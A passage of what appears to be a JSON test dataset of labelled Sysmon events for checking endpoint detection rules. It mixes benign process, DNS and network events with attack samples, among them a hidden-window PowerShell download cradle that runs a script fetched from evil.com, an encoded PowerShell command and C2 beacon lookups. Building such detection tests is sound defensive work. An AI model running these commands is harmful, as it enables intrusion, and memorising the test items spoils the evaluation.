[
  {
    "id": "SCEN-SYSMON-DEV-001",
    "ground_truth": "BENIGN",
    "category": "normal_process",
    "desc": "Explorer launches Notepad for editing a document",
    "events": [
      {
        "timestamp": "2026-10-08T10:00:01+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-2100-1791453601",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "notepad.exe",
        "parent_process": "explorer.exe",
        "process_id": 2100,
        "parent_process_id": 1024,
        "command_line": "notepad.exe C:\\Users\\jsmith\\notes.txt",
        "image_path": "C:\\Windows\\System32\\notepad.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: notepad.exe (PID: 2100) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-2100",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\notepad.exe\", \"CommandLine\": \"notepad.exe C:\\\\Users\\\\jsmith\\\\notes.txt\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-002",
    "ground_truth": "BENIGN",
    "category": "legitimate_powershell",
    "desc": "Administrator checks Windows services via PowerShell without obfuscation",
    "events": [
      {
        "timestamp": "2026-10-08T10:00:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-2110-1791453610",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "explorer.exe",
        "process_id": 2110,
        "parent_process_id": 1024,
        "command_line": "powershell.exe Get-Service -Name wuauserv",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 2110) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-2110",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe Get-Service -Name wuauserv\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-003",
    "ground_truth": "BENIGN",
    "category": "normal_network",
    "desc": "Edge browser initiates HTTPS connection to corporate portal",
    "events": [
      {
        "timestamp": "2026-10-08T10:00:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-3100-1791453620",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "msedge.exe",
        "parent_process": null,
        "process_id": 3100,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.10",
        "source_port": 51020,
        "destination_port": 443,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: msedge.exe (PID: 3100) 10.0.0.15:51020 -> 198.51.100.10:443 (tcp)",
        "raw_reference": "GUID-E3-3100",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-004",
    "ground_truth": "BENIGN",
    "category": "normal_dns",
    "desc": "Edge browser queries DNS for microsoft.com",
    "events": [
      {
        "timestamp": "2026-10-08T10:00:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-3100-1791453630",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "msedge.exe",
        "parent_process": null,
        "process_id": 3100,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "login.microsoft.com",
        "dns_response": "20.190.159.0",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: login.microsoft.com by msedge.exe (PID: 3100)",
        "raw_reference": "login.microsoft.com",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-005",
    "ground_truth": "BENIGN",
    "category": "normal_file_create",
    "desc": "Software installer creates DLL in Program Files",
    "events": [
      {
        "timestamp": "2026-10-08T10:00:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-1400-1791453640",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "msiexec.exe",
        "parent_process": null,
        "process_id": 1400,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\msiexec.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Program Files\\CorporateApp\\library.dll by msiexec.exe (PID: 1400)",
        "raw_reference": "C:\\Program Files\\CorporateApp\\library.dll",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Windows\\\\System32\\\\msiexec.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-006",
    "ground_truth": "BENIGN",
    "category": "normal_process_tree",
    "desc": "Services.exe launches svchost.exe for Windows Update",
    "events": [
      {
        "timestamp": "2026-10-08T10:00:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-880-1791453650",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "svchost.exe",
        "parent_process": "services.exe",
        "process_id": 880,
        "parent_process_id": 600,
        "command_line": "svchost.exe -k netsvcs -p -s wuauserv",
        "image_path": "C:\\Windows\\System32\\svchost.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: svchost.exe (PID: 880) by services.exe (PPID: 600)",
        "raw_reference": "GUID-E1-880",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": \"svchost.exe -k netsvcs -p -s wuauserv\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-007",
    "ground_truth": "BENIGN",
    "category": "developer_powershell",
    "desc": "Developer runs local PowerShell build script without hidden window or encoded command",
    "events": [
      {
        "timestamp": "2026-10-08T10:01:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-2200-1791453660",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "cmd.exe",
        "process_id": 2200,
        "parent_process_id": 2150,
        "command_line": "powershell.exe -ExecutionPolicy Bypass -File build.ps1",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 2200) by cmd.exe (PPID: 2150)",
        "raw_reference": "GUID-E1-2200",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -ExecutionPolicy Bypass -File build.ps1\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-008",
    "ground_truth": "BENIGN",
    "category": "legitimate_certutil",
    "desc": "Certutil verifies local certificate hash without network download",
    "events": [
      {
        "timestamp": "2026-10-08T10:01:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-2300-1791453670",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "certutil.exe",
        "parent_process": "explorer.exe",
        "process_id": 2300,
        "parent_process_id": 1024,
        "command_line": "certutil.exe -hashfile cert.crt SHA256",
        "image_path": "C:\\Windows\\System32\\certutil.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: certutil.exe (PID: 2300) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-2300",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\certutil.exe\", \"CommandLine\": \"certutil.exe -hashfile cert.crt SHA256\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-009",
    "ground_truth": "BENIGN",
    "category": "normal_dns",
    "desc": "Developer queries DNS for github.com",
    "events": [
      {
        "timestamp": "2026-10-08T10:01:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-3300-1791453680",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "git.exe",
        "parent_process": null,
        "process_id": 3300,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Git\\bin\\git.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "github.com",
        "dns_response": "140.82.121.4",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: github.com by git.exe (PID: 3300)",
        "raw_reference": "github.com",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Program Files\\\\Git\\\\bin\\\\git.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-010",
    "ground_truth": "BENIGN",
    "category": "normal_process",
    "desc": "Task manager launched by explorer",
    "events": [
      {
        "timestamp": "2026-10-08T10:01:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-2400-1791453690",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "taskmgr.exe",
        "parent_process": "explorer.exe",
        "process_id": 2400,
        "parent_process_id": 1024,
        "command_line": "taskmgr.exe",
        "image_path": "C:\\Windows\\System32\\taskmgr.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: taskmgr.exe (PID: 2400) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-2400",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\taskmgr.exe\", \"CommandLine\": \"taskmgr.exe\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-011",
    "ground_truth": "BENIGN",
    "category": "normal_network",
    "desc": "Outlook connects to Exchange over port 443",
    "events": [
      {
        "timestamp": "2026-10-08T10:01:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-3500-1791453700",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "OUTLOOK.EXE",
        "parent_process": null,
        "process_id": 3500,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.5",
        "source_port": 52100,
        "destination_port": 443,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: OUTLOOK.EXE (PID: 3500) 10.0.0.15:52100 -> 198.51.100.5:443 (tcp)",
        "raw_reference": "GUID-E3-3500",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\OUTLOOK.EXE\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-012",
    "ground_truth": "BENIGN",
    "category": "normal_image_load",
    "desc": "Legitimate DLL image loaded by explorer",
    "events": [
      {
        "timestamp": "2026-10-08T10:01:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E7-1024-1791453710",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "explorer.exe",
        "parent_process": null,
        "process_id": 1024,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\explorer.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_image_load",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Image Loaded: C:\\Windows\\System32\\shell32.dll by explorer.exe (PID: 1024)",
        "raw_reference": "GUID-E7-1024",
        "raw_log": "{\"EventID\": 7, \"Image\": \"C:\\\\Windows\\\\explorer.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-013",
    "ground_truth": "BENIGN",
    "category": "normal_dns",
    "desc": "System queries corporate domain controller DNS",
    "events": [
      {
        "timestamp": "2026-10-08T10:02:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-880-1791453720",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "svchost.exe",
        "parent_process": null,
        "process_id": 880,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\svchost.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "dc01.corp.internal",
        "dns_response": "10.0.0.1",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: dc01.corp.internal by svchost.exe (PID: 880)",
        "raw_reference": "dc01.corp.internal",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-014",
    "ground_truth": "ATTACK",
    "category": "suspicious_process_execution",
    "desc": "PowerShell launched with base64 encoded command payload",
    "expected_rule": "ENDPOINT-001",
    "events": [
      {
        "timestamp": "2026-10-08T10:02:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4100-1791453730",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "cmd.exe",
        "process_id": 4100,
        "parent_process_id": 4050,
        "command_line": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQALgAuAC4A",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 4100) by cmd.exe (PPID: 4050)",
        "raw_reference": "GUID-E1-4100",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQALgAuAC4A\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-015",
    "ground_truth": "ATTACK",
    "category": "suspicious_process_execution",
    "desc": "PowerShell executed with hidden window style and download cradle",
    "expected_rule": "ENDPOINT-001",
    "events": [
      {
        "timestamp": "2026-10-08T10:02:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4110-1791453740",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "explorer.exe",
        "process_id": 4110,
        "parent_process_id": 1024,
        "command_line": "powershell.exe -w hidden -nop -c \"IEX(New-Object Net.WebClient).downloadstring('http://evil.com/p.ps1')\"",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 4110) by explorer.exe (PPID: 1024)",
        "raw_reference": "GUID-E1-4110",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -w hidden -nop -c \\\"IEX(New-Object Net.WebClient).downloadstring('http://evil.com/p.ps1')\\\"\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-016",
    "ground_truth": "ATTACK",
    "category": "suspicious_parent_child",
    "desc": "IIS web server process w3wp.exe spawns interactive cmd.exe shell",
    "expected_rule": "ENDPOINT-002",
    "events": [
      {
        "timestamp": "2026-10-08T10:02:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4200-1791453750",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "cmd.exe",
        "parent_process": "w3wp.exe",
        "process_id": 4200,
        "parent_process_id": 2000,
        "command_line": "cmd.exe /c whoami",
        "image_path": "C:\\Windows\\System32\\cmd.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: cmd.exe (PID: 4200) by w3wp.exe (PPID: 2000)",
        "raw_reference": "GUID-E1-4200",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"CommandLine\": \"cmd.exe /c whoami\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-017",
    "ground_truth": "ATTACK",
    "category": "suspicious_parent_child",
    "desc": "Microsoft Word spawns PowerShell interpreter",
    "expected_rule": "ENDPOINT-002",
    "events": [
      {
        "timestamp": "2026-10-08T10:02:40+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E1-4210-1791453760",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": "WINWORD.EXE",
        "process_id": 4210,
        "parent_process_id": 3400,
        "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Calc.exe",
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_process_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Process Create: powershell.exe (PID: 4210) by WINWORD.EXE (PPID: 3400)",
        "raw_reference": "GUID-E1-4210",
        "raw_log": "{\"EventID\": 1, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Calc.exe\", \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-018",
    "ground_truth": "ATTACK",
    "category": "suspicious_network_connection",
    "desc": "Certutil.exe establishes outbound connection to external port 8080",
    "expected_rule": "ENDPOINT-003",
    "events": [
      {
        "timestamp": "2026-10-08T10:02:50+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-4300-1791453770",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "certutil.exe",
        "parent_process": null,
        "process_id": 4300,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\certutil.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "198.51.100.80",
        "source_port": 49500,
        "destination_port": 8080,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: certutil.exe (PID: 4300) 10.0.0.15:49500 -> 198.51.100.80:8080 (tcp)",
        "raw_reference": "GUID-E3-4300",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Windows\\\\System32\\\\certutil.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-019",
    "ground_truth": "ATTACK",
    "category": "suspicious_network_connection",
    "desc": "PowerShell connects to remote command-and-control port 4444",
    "expected_rule": "ENDPOINT-003",
    "events": [
      {
        "timestamp": "2026-10-08T10:03:00+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E3-4310-1791453780",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": null,
        "process_id": 4310,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": "10.0.0.15",
        "destination_ip": "203.0.113.50",
        "source_port": 49510,
        "destination_port": 4444,
        "protocol": "tcp",
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_network_connection",
        "event_category": "endpoint",
        "severity": "low",
        "message": "Network Connection: powershell.exe (PID: 4310) 10.0.0.15:49510 -> 203.0.113.50:4444 (tcp)",
        "raw_reference": "GUID-E3-4310",
        "raw_log": "{\"EventID\": 3, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-020",
    "ground_truth": "ATTACK",
    "category": "suspicious_dns",
    "desc": "PowerShell queries dynamic DNS domain for beaconing",
    "expected_rule": "ENDPOINT-004",
    "events": [
      {
        "timestamp": "2026-10-08T10:03:10+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-4400-1791453790",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": null,
        "process_id": 4400,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "beacon-c2.duckdns.org",
        "dns_response": "198.51.100.99",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: beacon-c2.duckdns.org by powershell.exe (PID: 4400)",
        "raw_reference": "beacon-c2.duckdns.org",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-021",
    "ground_truth": "ATTACK",
    "category": "suspicious_dns",
    "desc": "Script host queries C2 staging tunnel domain",
    "expected_rule": "ENDPOINT-004",
    "events": [
      {
        "timestamp": "2026-10-08T10:03:20+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E22-4410-1791453800",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "wscript.exe",
        "parent_process": null,
        "process_id": 4410,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\wscript.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": "c2-stage.internal-tunnel.me",
        "dns_response": "198.51.100.101",
        "event_type": "sysmon_dns_query",
        "event_category": "endpoint",
        "severity": "low",
        "message": "DNS Query: c2-stage.internal-tunnel.me by wscript.exe (PID: 4410)",
        "raw_reference": "c2-stage.internal-tunnel.me",
        "raw_log": "{\"EventID\": 22, \"Image\": \"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-022",
    "ground_truth": "ATTACK",
    "category": "suspicious_file_creation",
    "desc": "PowerShell writes binary executable to local user Temp directory",
    "expected_rule": "ENDPOINT-005",
    "events": [
      {
        "timestamp": "2026-10-08T10:03:30+00:00",
        "source_type": "SYSMON",
        "source_name": "Microsoft-Windows-Sysmon",
        "event_id": "SYSMON-CORP-WKSTN-01-E11-4500-1791453810",
        "hostname": "CORP-WKSTN-01",
        "username": "CORP\\jsmith",
        "process": "powershell.exe",
        "parent_process": null,
        "process_id": 4500,
        "parent_process_id": 500,
        "command_line": null,
        "image_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "file_hash": null,
        "source_ip": null,
        "destination_ip": null,
        "source_port": null,
        "destination_port": null,
        "protocol": null,
        "dns_query": null,
        "dns_response": null,
        "event_type": "sysmon_file_create",
        "event_category": "endpoint",
        "severity": "low",
        "message": "File Create: C:\\Users\\jsmith\\AppData\\Local\\Temp\\dropper.exe by powershell.exe (PID: 4500)",
        "raw_reference": "C:\\Users\\jsmith\\AppData\\Local\\Temp\\dropper.exe",
        "raw_log": "{\"EventID\": 11, \"Image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": null, \"Computer\": \"CORP-WKSTN-01\"}"
      }
    ],
    "split": "development",
    "events_count": 1
  },
  {
    "id": "SCEN-SYSMON-DEV-023",
    "ground_truth": "ATTACK",
